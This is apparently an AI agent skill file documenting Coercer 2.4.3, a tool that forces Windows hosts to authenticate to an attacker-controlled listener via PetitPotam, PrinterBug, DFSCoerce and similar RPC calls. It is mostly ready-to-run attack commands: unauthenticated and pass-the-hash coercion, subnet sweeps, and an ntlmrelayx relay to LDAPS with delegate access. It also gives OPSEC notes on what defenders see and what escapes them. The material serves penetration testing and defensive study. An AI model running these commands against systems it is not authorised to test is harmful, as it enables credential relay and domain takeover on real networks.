---
name: coercer
description: "Force a Windows host to authenticate to a listener you control using MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-DFSNM, MS-EVEN and MS-FSRVP calls. Use when you need machine or user NTLM authentication without waiting for broadcast traffic. Not for capturing broadcast hashes (use responder) and not for IPv6 DNS takeover (use mitm6)."
---

# Coercer

Coercer drives the RPC interfaces that make Windows open an authenticated connection to a path you choose. It is the deterministic alternative to poisoning: instead of waiting for a typo, you ask a specific server to authenticate to you, then relay or capture that authentication. Version here is 2.4.3. Its `scan` mode tests every known method against a target and reports which ones work; `coerce` runs the same methods with `--always-continue` automation; `fuzz` tries many exploit-path variants per method.

## When to use

| Goal | Mode | Command shape |
| --- | --- | --- |
| Find which coercion methods a host allows | `scan` | `coercer scan -t 10.0.0.5 -I 10.0.0.1` |
| Trigger a specific known weakness | `coerce` | `coercer coerce -t 10.0.0.5 -l 10.0.0.1 --always-continue` |
| Sweep a subnet, one method family | `coerce -f` + filter | add `--filter-protocol-name MS-EFSR` |
| Only PetitPotam-style EFSRPC calls | method filter | `--filter-method-name EfsRpc` |
| Try every exploit-path variant | `fuzz` | `coercer fuzz -t 10.0.0.5 -I 10.0.0.1` |
| Produce a report for the client | export | `--export-json`, `--export-sqlite`, `--export-xlsx` |
| Use existing credentials | auth | `-u user -p pass -d CORP --dc-ip 10.0.0.10` |
| Null session where allowed | auth | `-u '' -p '' --no-pass` |

Coercer proves that a host can be made to authenticate. It does **not** complete the SMB or HTTP handshake and does not capture a hash: its listener accepts one connection for about one second and only checks for an SMB or HTTP banner. For a usable hash or relay, put `ntlmrelayx.py` on that port instead (see the relay note under Workflow).

## Prerequisites

- Network reach to the target on 135 (DCERPC endpoint mapper), 445, and the dynamic RPC range for named-pipe transports.
- A listener IP the target can reach: `-l` is required in `coerce`. `scan` and `fuzz` accept `-I <ip>` or `-i <iface>`, and bind `0.0.0.0` when neither is given.
- Ports free. Check before starting, because a silently failed bind turns a working coercion into `NO_AUTH_RECEIVED`:

```sh
ss -tulpn | grep -E ':(445|80)\b'
```

- Credentials are optional. Many methods work unauthenticated; pass `--no-pass` to stop the password prompt. This build has **no** `-k` flag even though the `--no-pass` help text still mentions it, so Kerberos ccache auth is not available here.
- On this host the binary is `~/.local/bin/coercer` from pipx (`coercer 2.4.3`).

## Core invocations

```sh
# 1. Full sweep of all methods and known paths against one host
coercer scan -t 10.10.10.50 -I 10.10.10.99

# 2. Sweep with credentials and keep a machine-readable report
coercer scan -t 10.10.10.50 -I 10.10.10.99 -u svc_scan -p 'Fake!Pass1' -d CORP --dc-ip 10.10.10.10 --export-json scan.json

# 3. Sweep a list of hosts, 30 records at a time, 1s between attempts
coercer scan -f hosts.txt -I 10.10.10.99 --delay 1 --export-sqlite coercion.db

# 4. Coerce with every method, no interactive prompts (the automation default)
coercer coerce -t 10.10.10.50 -l 10.10.10.99 --always-continue

# 5. Coerce unauthenticated: null session, no password prompt
coercer coerce -t 10.10.10.50 -l 10.10.10.99 --no-pass --always-continue

# 6. PetitPotam family only (MS-EFSR)
coercer coerce -t 10.10.10.50 -l 10.10.10.99 --filter-protocol-name MS-EFSR --always-continue

# 7. Single EFSRPC function by name substring
coercer coerce -t 10.10.10.50 -l 10.10.10.99 --filter-method-name EfsRpcOpenFileRaw --always-continue

# 8. PrinterBug only (MS-RPRN)
coercer coerce -t 10.10.10.50 -l 10.10.10.99 --filter-protocol-name MS-RPRN --always-continue

# 9. Force HTTP authentication on a non-80 port
coercer coerce -t 10.10.10.50 -l 10.10.10.99 --auth-type http --http-port 8080 --always-continue

# 10. SMB over a non-445 port (renders as \\host@port\share, WebDAV-style)
coercer coerce -t 10.10.10.50 -l 10.10.10.99 --smb-port 8445 --always-continue

# 11. Only DCERPC transports, skip named-pipe paths
coercer coerce -f hosts.txt -l 10.10.10.99 --filter-transport-name dcerpc --always-continue

# 12. Fuzz every exploit-path variant on a stubborn host
coercer fuzz -t 10.10.10.50 -I 10.10.10.99 --only-known-exploit-paths

# 13. Pass-the-hash instead of a password
coercer coerce -t 10.10.10.50 -l 10.10.10.99 -u administrator -d CORP --hashes :31d6cfe0d16ae931b73c59d7e0c089c0 --always-continue
```

Method-to-protocol map, as implemented in this version:

| Name in guides | Protocol filter | Function name filter |
| --- | --- | --- |
| PetitPotam | `MS-EFSR` | `EfsRpcOpenFileRaw`, `EfsRpcFileKeyInfo` |
| PrinterBug | `MS-RPRN` | `RpcRemoteFindFirstPrinterChangeNotification` |
| DFSCoerce | `MS-DFSNM` | `NetrDfsAddStdRoot`, `NetrDfsRemoveStdRoot` |
| MSEven | `MS-EVEN` | `ElfrOpenBELW` |
| ShadowCoerce | `MS-FSRVP` | `IsPathSupported`, `IsPathShadowCopied` |

Filters are case-sensitive substring matches on the RPC function name or the protocol shortname, so `EfsRpc` matches the whole EFSRPC family while `efsrpc` matches nothing.

## Flags that matter

| Flag | Effect | Note |
| --- | --- | --- |
| `-t` / `-f` | single target / targets file | one of them is required in all modes |
| `-l` | listener IP, required in `coerce` | must be reachable from the target |
| `-I` / `-i` | listener IP / interface for `scan` and `fuzz` | optional; binds all interfaces if omitted |
| `--always-continue` | skip the `Continue (C) / Skip (S) / Stop (X)` prompt | without it, scripts hang after each attempt |
| `--auth-type` | `smb` or `http` | chooses which listener port is used |
| `--smb-port`, `--http-port` | listener ports, defaults 445 and 80 | non-445 renders `\\host@port\` |
| `--dce-port`, `--dce-ports` | endpoint mapper / explicit ports, default 135 | set when dynamic RPC is firewalled |
| `--filter-protocol-name` | protocol shortname substring | `MS-EFSR`, `MS-RPRN`, `MS-DFSNM` |
| `--filter-method-name` | function name substring | exact case matters |
| `--filter-transport-name` | `msrpc` or `dcerpc` | `dcerpc` uses the 135 endpoint map |
| `--delay` | seconds between attempts | use it on production segments |
| `-u/-p/-d/--hashes/--no-pass` | credentials | omit `-u` for a null session; no `-k` in 2.4.3 |
| `--dc-ip` | DC for domain resolution | optional when the target FQDN resolves |

## Workflow

1. **Confirm the listener is not already busy.** `ss -tulpn` for 445/80. A bind failure is swallowed and reported as no authentication.
2. **Scan first.** `scan` tests known working paths across all methods in one pass and prints one line per attempt: `[+] (SMB  Auth)` or `[+] (HTTP Auth)` on success, `[!] (<RESULT>)` on failure. Export to JSON or SQLite; do not scrape the console.
3. **Pick the least noisy working method.** `MS-EFSR` and `MS-DFSNM` are usually enough; `MS-RPRN` requires the spooler and is heavily monitored.
4. **Detect, then exploit separately.** `coerce -l <attacker>` only proves the callback arrives. To turn it into a hash or a relayed session, stop coercer, start `ntlmrelayx.py` on that IP and port, and re-trigger the same method with it listening:

```sh
ntlmrelayx.py -t ldaps://dc01.corp.local -smb2support --delegate-access
```

   Do not run both on port 445. Coercer's listener binds per attempt and fails silently when ntlmrelayx already holds the port, so a `NO_AUTH_RECEIVED` table while the relay console shows a session means the relay caught it, not that coercion failed.
5. **Verify by result, not by assumption.** `NCA_S_UNK_IF` means the interface is not exposed (patched); `RPC_S_ACCESS_DENIED` means the call is rejected; an SMB or HTTP banner means the target really authenticated.
6. **Record method and result per host.** The exported report is the engagement evidence; console output is not.

## OPSEC and telemetry

- Coercion creates outbound authenticated connections from the *target* server, so the victim's own logs show it connecting to an unfamiliar host on 445/80. That is the anomaly defenders look for.
- PetitPotam-style EFSRPC calls are covered by Defender and by EDR RPC telemetry; expect an alert on unpatched test domains.
- Each RPC bind and call is visible in the DCERPC endpoint mapper; a sweep across a subnet touches every host's 135/445 and looks exactly like what it is.
- Coercer itself logs to stdout only; the exported JSON/SQLite is your artifact. Keep victim IPs out of shared reports.
- When relaying, the useful authentication appears as a normal network logon on the *relay target*, so the DC sees nothing unusual.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| every method `NO_AUTH_RECEIVED` while relay logs a session | 445/80 already held by ntlmrelayx | expected; trust the relay console instead |
| `[!] DCERPC port '135' is closed!` | endpoint mapper filtered | open only if in scope, or use named-pipe methods |
| `RPC_S_ACCESS_DENIED` on all methods | patched host or insufficient rights | try `-u/-p` with an account that can bind |
| `NCA_S_UNK_IF` | interface not implemented or removed | skip that family, try `MS-DFSNM`/`MS-EVEN` |
| `ERROR_BAD_NETPATH` | target cannot reach the SMB listener | check routing and `--smb-port` |
| command hangs after each attempt | interactive prompt | add `--always-continue` |
| `No module named openpyxl` on `--export-xlsx` | optional dependency missing | export JSON or SQLite |
| `unrecognized arguments: -k` | Kerberos flag does not exist in 2.4.3 | use `-u/-p` or `--hashes` |
| target list processed but every host identical | `--delay 0` floods and RPC calls time out | raise `--delay`, lower concurrency |

## Verification

```sh
coercer --help | head -6                # banner with v2.4.3 and scan/coerce/fuzz
coercer coerce --help | head -12        # confirms -l is required, -t/-f exclusive
ss -tulpn | grep -E ':(445|80)\b'       # listener ports free
```

A successful `scan` run prints at least one `[+] (SMB  Auth)` or `[+] (HTTP Auth)` line. Every other method prints nothing or a `[!]` line naming the result, such as `NCA_S_UNK_IF` or `RPC_S_ACCESS_DENIED`. Zero successes across all methods on a current Windows Server is the expected result, not a broken tool: verify the listener firewall first.

## Related skills

- [responder](../responder/SKILL.md) for broadcast-based capture when coercion is patched everywhere
- [mitm6](../mitm6/SKILL.md) when the authentication trigger must come from DHCPv6 DNS takeover
- [impacket](../impacket/SKILL.md) for `ntlmrelayx.py`, `PetitPotam.py`, `printerbug.py` and `dfscoerce.py`
- [netexec](../netexec/SKILL.md) to find hosts without SMB signing before relaying
- [hashcat](../hashcat/SKILL.md) if the coerced hash is captured rather than relayed